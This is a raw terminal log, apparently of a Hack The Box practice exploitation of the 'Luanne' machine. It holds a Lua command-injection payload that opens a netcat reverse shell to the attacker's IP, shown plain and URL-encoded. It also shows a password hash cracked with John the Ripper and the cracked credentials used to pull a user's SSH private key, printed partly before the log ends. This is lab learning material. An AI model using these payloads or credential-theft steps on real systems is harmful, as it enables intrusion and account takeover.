@@ -1,0 +1,587 @@
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# cd HTB
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB# cd luanne
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# ls
+luanne.txt  paylaodmak.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# cat payloadmak.txt
+cat: payloadmak.txt: No such file or directory
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# cat paylaodmak.txt
+first we need os , to search paylaod to execute in the http://luanne.htb/weather/forecast?city=payload
+
+
+form nmap os: NetBSD
+now go to : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+for revesre shell single line payload command, go into netcat openbsd you find:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+
+
+now we have the payload , now for executing thsi command we need syntex so , 
+simply go in GFTObins and search for lua you will get the syntex:
+lua -e 'os.execute("/bin/sh")'
+we will use:this part:
+'os.execute("/bin/sh")'
+
+get the material now start making payload:
+
+');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f")'
+
+now by using an online urlencoder encode this in url language:
+  
+get the encode : 
+%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.21%201234%20%3E%2Ftmp%2Ff%22%29%27
+
+now replace this with the payload in the url given at the top line
+ and also open a netcat session on port 1234
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# ^C
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# ifconfig
+eno1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 9c:7b:ef:11:27:49  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 2497  bytes 239492 (239.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2497  bytes 239492 (239.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.14.21  netmask 255.255.254.0  destination 10.10.14.21
+        inet6 fe80::e47e:ac06:e92b:e184  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef:2::1013  prefixlen 64  scopeid 0x0<global>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
+        RX packets 20  bytes 3249 (3.2 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 114  bytes 9993 (9.9 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlo1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.43.224  netmask 255.255.255.0  broadcast 192.168.43.255
+        inet6 fe80::5751:1d96:76ee:8a70  prefixlen 64  scopeid 0x20<link>
+        inet6 2409:4043:491:f0ee:6186:21e2:d041:8d38  prefixlen 64  scopeid 0x0<global>
+        inet6 2409:4043:491:f0ee:8140:1803:4878:a982  prefixlen 64  scopeid 0x0<global>
+        ether dc:f5:05:a2:df:d5  txqueuelen 1000  (Ethernet)
+        RX packets 17725  bytes 14082055 (14.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 14916  bytes 3659050 (3.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# ls
+luanne.txt  paylaodmak.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# nano paylaodmak.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# ifconfig
+eno1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 9c:7b:ef:11:27:49  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 4785  bytes 585417 (585.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4785  bytes 585417 (585.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.14.21  netmask 255.255.254.0  destination 10.10.14.21
+        inet6 fe80::e47e:ac06:e92b:e184  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef:2::1013  prefixlen 64  scopeid 0x0<global>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
+        RX packets 120  bytes 14155 (14.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 410  bytes 48358 (48.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlo1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.43.224  netmask 255.255.255.0  broadcast 192.168.43.255
+        inet6 fe80::5751:1d96:76ee:8a70  prefixlen 64  scopeid 0x20<link>
+        inet6 2409:4043:491:f0ee:6186:21e2:d041:8d38  prefixlen 64  scopeid 0x0<global>
+        inet6 2409:4043:491:f0ee:8140:1803:4878:a982  prefixlen 64  scopeid 0x0<global>
+        ether dc:f5:05:a2:df:d5  txqueuelen 1000  (Ethernet)
+        RX packets 62325  bytes 50280811 (50.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 49535  bytes 11759392 (11.7 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# ^C
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# john
+Created directory: /root/.john
+John the Ripper password cracker, version 1.8.0
+Copyright (c) 1996-2013 by Solar Designer
+Homepage: http://www.openwall.com/john/
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+--single                   "single crack" mode
+--wordlist=FILE --stdin    wordlist mode, read words from FILE or stdin
+--rules                    enable word mangling rules for wordlist mode
+--incremental[=MODE]       "incremental" mode [using section MODE]
+--external=MODE            external mode or word filter
+--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
+--restore[=NAME]           restore an interrupted session [called NAME]
+--session=NAME             give a new session the NAME
+--status[=NAME]            print status of a session [called NAME]
+--make-charset=FILE        make a charset, FILE will be overwritten
+--show                     show cracked passwords
+--test[=TIME]              run tests and benchmarks for TIME seconds each
+--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
+--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
+--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
+--salts=[-]N               load salts with[out] at least N passwords only
+--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
+--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
+--fork=N                   fork N processes
+--format=NAME              force hash type NAME: descrypt/bsdicrypt/md5crypt/
+                           bcrypt/LM/AFS/tripcode/dummy/crypt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# nano hash
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Loaded 1 password hash (md5crypt [MD5 32/64 X2])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iamthebest       (webapi_user)
+1g 0:00:00:00 100% 1.639g/s 4862p/s 4862c/s 4862C/s iamthebest..flowerpower
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# nc -nvlp 9090
+Listening on 0.0.0.0 9090
+Connection received on 10.10.10.218 65452
+sh: can't access tty; job control turned off
+$ ls
+index.html
+robots.txt
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+sh: python3: not found
+$ whoami
+_httpd
+$ id
+uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+$ cd home
+cd: can't cd to home
+$ cd /home
+$ ls
+r.michaels
+$ cd r.michaels
+cd: can't cd to r.michaels
+$ cat r.michaels
+cat: r.michaels: Permission denied
+$ file r.michaels
+r.michaels: directory
+$ su r.michaels
+ Inappropriate ioctl for device
+su: Sorry: Conversation failure
+$ su michaels
+su: unknown login michaels
+$ cd /var/www/html
+cd: can't cd to /var/www/html
+$ cd /var
+$ cd www
+$ cd html
+cd: can't cd to html
+$ ls
+index.html
+robots.txt
+$ cat robots.txt
+User-agent: *
+Disallow: /weather  #returning 404 but still harvesting cities 
+$ cat index.html
+<!doctype html>
+<html>
+  <head>
+    <title>Index</title>
+  </head>
+  <body>
+    <p><h3>Weather Forecast API</h3></p>
+    <p><h4>List available cities:</h4></p>
+    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
+    <p><h4>Five day forecast (London)</h4></p>
+    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
+    <hr>
+  </body>
+</html>
+$ cd /log
+cd: can't cd to /log
+$ cat /etc/passwd
+root:*:0:0:Charlie &:/root:/bin/sh
+toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
+daemon:*:1:1:The devil himself:/:/sbin/nologin
+operator:*:2:5:System &:/usr/guest/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+games:*:7:13:& pseudo-user:/usr/games:/sbin/nologin
+postfix:*:12:12:& pseudo-user:/var/spool/postfix:/sbin/nologin
+named:*:14:14:& pseudo-user:/var/chroot/named:/sbin/nologin
+ntpd:*:15:15:& pseudo-user:/var/chroot/ntpd:/sbin/nologin
+sshd:*:16:16:& pseudo-user:/var/chroot/sshd:/sbin/nologin
+_pflogd:*:18:18:& pseudo-user:/var/chroot/pflogd:/sbin/nologin
+_rwhod:*:19:19:& pseudo-user:/var/rwho:/sbin/nologin
+_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
+_timedc:*:22:22:& pseudo-user:/nonexistent:/sbin/nologin
+_sdpd:*:23:23:& pseudo-user:/nonexistent:/sbin/nologin
+_httpd:*:24:24:& pseudo-user:/var/www:/sbin/nologin
+_mdnsd:*:25:25:& pseudo-user:/nonexistent:/sbin/nologin
+_tests:*:26:26:& pseudo-user:/nonexistent:/sbin/nologin
+_tcpdump:*:27:27:& pseudo-user:/var/chroot/tcpdump:/sbin/nologin
+_tss:*:28:28:& pseudo-user:/var/tpm:/sbin/nologin
+_rtadvd:*:30:30:& pseudo-user:/var/chroot/rtadvd:/sbin/nologin
+_unbound:*:32:32:& pseudo-user:/var/chroot/unbound:/sbin/nologin
+_nsd:*:33:33:& pseudo-user:/var/chroot/nsd:/sbin/nologin
+uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
+nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
+r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
+nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
+dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
+$ su root
+su: You are not listed in the correct secondary group (wheel) to su root.
+su: Sorry: Authentication error
+$ ls
+index.html
+robots.txt
+$ ls -lah
+total 1.5K
+drwxr-xr-x   2 root  wheel  512B Nov 25 11:27 .
+drwxr-xr-x  24 root  wheel  512B Nov 24 09:55 ..
+-rw-r--r--   1 root  wheel   47B Sep 16 15:07 .htpasswd
+-rw-r--r--   1 root  wheel  386B Sep 17 20:56 index.html
+-rw-r--r--   1 root  wheel   78B Nov 25 11:38 robots.txt
+$ cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+$ su webapi_user
+su: unknown login webapi_user
+$ netstat -ant
+Active Internet connections (including servers)
+Proto Recv-Q Send-Q  Local Address          Foreign Address        State
+tcp        0      0  10.10.10.218.65452     10.10.14.21.9090       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65453        CLOSE_WAIT
+tcp        0      0  127.0.0.1.65453        127.0.0.1.3000         FIN_WAIT_2
+tcp        0      0  10.10.10.218.65456     10.10.14.21.1234       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65457        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65459     10.10.14.35.1234       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65460        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65466     10.10.14.61.3787       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65467        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65468     10.10.14.21.1234       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65469        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65472     10.10.14.21.1234       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65473        CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65492        CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65525        CLOSE_WAIT
+tcp        0      0  10.10.10.218.22        10.10.16.6.52648       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
+tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
+tcp        0      0  *.80                   *.*                    LISTEN
+tcp        0      0  *.22                   *.*                    LISTEN
+tcp        0      0  *.9001                 *.*                    LISTEN
+Active Internet6 connections (including servers)
+Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
+tcp6       0      0  *.22                   *.*                    LISTEN
+Active UNIX domain sockets
+Address  Type   Recv-Q Send-Q    Inode     Conn     Refs  Nextref Addr
+fffffb7a7cf6b5f0 stream      0      0        0        0        0        0 
+fffffb7b2b924268 stream      0      0        0 fffffb7b2b9242d8        0        0 
+fffffb7b2b9242d8 stream      0      0        0 fffffb7b2b924268        0        0 
+fffffb7a7cf6bc10 stream      0      0        0 fffffb7a7cf6bba0        0        0 
+fffffb7a7cf6bba0 stream      0      0        0 fffffb7a7cf6bc10        0        0 
+fffffb7a7cf6b3c0 stream      0      0 fffffb7b2bf6ec08        0        0        0 /var/supervisord/run/supervisord.sock.340
+fffffb7b2b9243b8 dgram       0      0        0 fffffb7a7cf6b580        0 fffffb7a7cf6bf20 -> /var/run/log
+fffffb7a7cf6bf20 dgram       0      0        0 fffffb7a7cf6b580        0 fffffb7a7cf6bd60 -> /var/run/log
+fffffb7a7cf6bd60 dgram       0      0        0 fffffb7a7cf6b580        0 fffffb7a7cf6b7b0 -> /var/run/log
+fffffb7a7cf6b7b0 dgram       0      0        0 fffffb7a7cf6b580        0        0 -> /var/run/log
+fffffb7a7cf6b900 dgram       0      0        0        0        0        0 
+fffffb7a7cf6b580 dgram       0      0 fffffb7b2e73ed60        0 fffffb7b2b9243b8        0 /var/run/log
+$ nc 127.0.0.1 3000
+HTTP/1.1 408 Request Timeout
+Content-Type: text/html
+Content-Length: 0
+Server: bozohttpd/20190228
+
+cat /etc/passwd
+^Z
+[3]+  Stopped                 nc -nvlp 9090
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# nc -nvlp 9090
+Listening on 0.0.0.0 9090
+
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# nc -nvlp 9090
+Listening on 0.0.0.0 9090
+^Z
+[1]+  Stopped                 nc -nvlp 9090
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/luanne# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.10.218 65490
+sh: can't access tty; job control turned off
+$ ls
+index.html
+robots.txt
+$ netstat -ant
+Active Internet connections (including servers)
+Proto Recv-Q Send-Q  Local Address          Foreign Address        State
+tcp        0      0  10.10.10.218.65490     10.10.14.21.1234       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65491        ESTABLISHED
+tcp        0      0  127.0.0.1.65491        127.0.0.1.3000         ESTABLISHED
+tcp        0      0  10.10.10.218.65497     10.10.14.72.8888       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65498        CLOSE_WAIT
+tcp        0      0  127.0.0.1.65498        127.0.0.1.3000         FIN_WAIT_2
+tcp        0      0  10.10.10.218.80        10.10.14.21.60012      ESTABLISHED
+tcp        0      0  10.10.10.218.65519     10.10.14.61.3787       ESTABLISHED
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65520        CLOSE_WAIT
+tcp        0      0  10.10.10.218.65530     10.10.14.61.3787       CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         127.0.0.1.65531        CLOSE_WAIT
+tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
+tcp        0      0  127.0.0.1.3001         *.*                    LISTEN
+tcp        0      0  *.80                   *.*                    LISTEN
+tcp        0      0  *.22                   *.*                    LISTEN
+tcp        0      0  *.9001                 *.*                    LISTEN
+Active Internet6 connections (including servers)
+Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
+tcp6       0      0  *.22                   *.*                    LISTEN
+Active UNIX domain sockets
+Address  Type   Recv-Q Send-Q    Inode     Conn     Refs  Nextref Addr
+ffffbb97f7b6ba50 stream      0      0        0 ffffbb97f7b6b9e0        0        0 
+ffffbb97f7b6b970 stream      0      0 ffffbb98a66a9c08        0        0        0 /var/supervisord/run/supervisord.sock.340
+ffffbb97f7b6b9e0 stream      0      0        0 ffffbb97f7b6ba50        0        0 
+ffffbb97f7b6bc10 dgram       0      0        0 ffffbb97f7b6b4a0        0 ffffbb97f7b6b5f0 -> /var/run/log
+ffffbb97f7b6bcf0 dgram       0      0        0 ffffbb97f7b6b4a0        0 ffffbb97f7b6bc10 -> /var/run/log
+ffffbb97f7b6b5f0 dgram       0      0        0 ffffbb97f7b6b4a0        0        0 -> /var/run/log
+ffffbb97f7b6b890 dgram       0      0        0        0        0        0 
+ffffbb97f7b6b4a0 dgram       0      0 ffffbb98a8f5ac08        0 ffffbb97f7b6bcf0        0 /var/run/log
+$ ps   
+PID TTY STAT TIME COMMAND
+$ ps aux
+USER        PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
+root          0  0.0  0.2      0 12976 ?     OKl  12:42PM 0:02.14 [system]
+root          1  0.0  0.0  22028  1528 ?     Is   12:42PM 0:00.01 init 
+root        163  0.0  0.0  33724  2304 ?     Ss   12:42PM 0:00.03 /usr/sbin/sys
+r.michaels  185  0.0  0.0  34992  2004 ?     Is   12:42PM 0:00.01 /usr/libexec/
+root        298  0.0  0.0  23468  1332 ?     Is   12:42PM 0:00.00 /usr/sbin/pow
+root        299  0.0  0.0  33368  1828 ?     Is   12:42PM 0:00.00 nginx: master
+root        318  0.0  0.1 117944  7164 ?     Il   12:42PM 0:03.85 /usr/pkg/bin/
+_httpd      336  0.0  0.2 117976 11796 ?     Ss   12:42PM 0:01.97 /usr/pkg/bin/
+root        348  0.0  0.0  71348  2932 ?     Is   12:42PM 0:00.01 /usr/sbin/ssh
+nginx       373  0.0  0.1  33652  3228 ?     I    12:42PM 0:16.70 nginx: worker
+_httpd      376  0.0  0.0  36872  2000 ?     Is   12:42PM 0:00.01 /usr/libexec/
+root        402  0.0  0.0  20216  1656 ?     Is   12:42PM 0:00.01 /usr/sbin/cro
+_httpd      409  0.0  0.0  20776  1728 ?     I    12:51PM 0:00.01 /bin/sh -i 
+_httpd      411  0.0  0.0  20820  1656 ?     I    12:42PM 0:00.14 /bin/sh /usr/
+_httpd      422  0.0  0.0  19988  1652 ?     I    12:42PM 0:00.08 /bin/sh /usr/
+_httpd      436  0.0  0.0  19988  1648 ?     I    12:42PM 0:00.06 /bin/sh /usr/
+_httpd      646  0.0  0.0  37172  2324 ?     I    12:51PM 0:00.00 /usr/libexec/
+_httpd      690  0.0  0.0  20028  1712 ?     I    12:51PM 0:00.00 sh -c rm /tmp
+_httpd      699  0.0  0.0  15952  1396 ?     I    12:51PM 0:00.02 nc 10.10.14.6
+_httpd      918  0.0  0.0  15436  1280 ?     I    12:51PM 0:00.00 cat /tmp/f 
+_httpd      927  0.0  0.0  20040  1408 ?     I    12:59PM 0:00.03 nc 10.10.14.6
+_httpd     1060  0.0  0.0  15436  1280 ?     I    12:59PM 0:00.00 cat /tmp/f 
+_httpd     1166  0.0  0.0  20032  1720 ?     I    12:59PM 0:00.00 sh -c rm /tmp
+_httpd     1198  0.0  0.0  20072  1712 ?     I    12:59PM 0:00.01 /bin/sh -i 
+_httpd     1271  0.0  0.0  37172  2324 ?     I    12:59PM 0:00.00 /usr/libexec/
+_httpd     1801  0.0  0.0  20040  1708 ?     I     1:53PM 0:00.00 /bin/sh -i 
+_httpd     1933  0.0  0.0  20052  1712 ?     S     1:55PM 0:00.00 /bin/sh -i 
+_httpd     2316  0.0  0.0  15600  1276 ?     S     1:55PM 0:00.00 cat /tmp/f 
+_httpd     2480  0.0  0.0  21220  1712 ?     I     1:53PM 0:00.00 sh -c rm  /tm
+_httpd     2525  0.0  0.0  17636  1384 ?     I     1:59PM 0:00.00 sleep 30 
+_httpd     2669  0.0  0.0  37172  2324 ?     I     1:55PM 0:00.00 /usr/libexec/
+_httpd     2695  0.0  0.0  20032  1724 ?     I     1:55PM 0:00.00 sh -c rm /tmp
+_httpd     2721  0.0  0.0  15948  1388 ?     S     1:55PM 0:00.00 nc 10.10.14.2
+_httpd     2782  0.0  0.0  15948  1392 ?     I     1:53PM 0:00.00 nc 10.10.14.7
+_httpd     2964  0.0  0.0  18320  1276 ?     I     1:53PM 0:00.00 cat /tmp/magi
+_httpd     3016  0.0  0.0  17636  1384 ?     I     1:59PM 0:00.00 sleep 30 
+_httpd     3123  0.0  0.0  37172  2328 ?     I     1:53PM 0:00.00 /usr/libexec/
+_httpd     3146  0.0  0.0  19868  1524 ?     O     1:59PM 0:00.00 ps -aux 
+_httpd     3333  0.0  0.0  17640  1388 ?     I     1:59PM 0:00.00 sleep 30 
+root        423  0.0  0.0  19780  1584 ttyE0 Is+  12:42PM 0:00.00 /usr/libexec/
+root        421  0.0  0.0  19784  1588 ttyE1 Is+  12:42PM 0:00.00 /usr/libexec/
+root        388  0.0  0.0  19784  1584 ttyE2 Is+  12:42PM 0:00.00 /usr/libexec/
+root        433  0.0  0.0  19780  1584 ttyE3 Is+  12:42PM 0:00.00 /usr/libexec/
+$ clear
+tput: No terminal type specified and no TERM variable set in the environment.
+$ curl 127.0.0.1:3000/etc/passwd
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   214  100   214    0     0  71333      0 --:--:-- --:--:-- --:--:-- 71333
+<html><head><title>404 Not Found</title></head>
+<body><h1>404 Not Found</h1>
+etc/passwd: <pre>This item has not been found</pre>
+<hr><address><a href="//127.0.0.1:3000/">127.0.0.1:3000</a></address>
+</body></html>
+$ lets grap the ssh key of r.michaels
+sh: lets: not found
+$ curl 127.0.0.1:3000/~r.michaels/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   235  100   235    0     0  58750      0 --:--:-- --:--:-- --:--:-- 58750
+<html><head><title>404 Not Found</title></head>
+<body><h1>404 Not Found</h1>
+~r.michaels//~r.michaels/id_rsa: <pre>This item has not been found</pre>
+<hr><address><a href="//127.0.0.1:3000/">127.0.0.1:3000</a></address>
+</body></html>
+$ lets try for 3001
+sh: lets: not found
+$ curl 127.0.0.1:3001/~r.michaels/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   217  100   217    0     0  72333      0 --:--:-- --:--:-- --:--:-- 72333
+<html><head><title>401 Unauthorized</title></head>
+<body><h1>401 Unauthorized</h1>
+~r.michaels//id_rsa: <pre>No authorization</pre>
+<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
+</body></html>
+$ it is telling no authorization means we need password ,lets try with webapi_user:iamthebest credentials we get
+sh: it: not found
+$ curl --user webapi:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   217  100   217    0     0  72333      0 --:--:-- --:--:-- --:--:-- 72333
+<html><head><title>401 Unauthorized</title></head>
+<body><h1>401 Unauthorized</h1>
+~r.michaels//id_rsa: <pre>No authorization</pre>
+<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
+</body></html>
+$ curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2610  100  2610    0     0   637k      0 --:--:-- --:--:-- --:--:--  637k
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
+Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh
+0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ
+kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD
+ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK
+BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8
+3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE
+pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2
+EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM
+3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I
+GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF
+8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb
+Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa
+POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3
+GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW
+nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm
+xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl
+7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP
+DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX
+er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n
+NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su
+o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8
+Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA
+wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6
+LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv
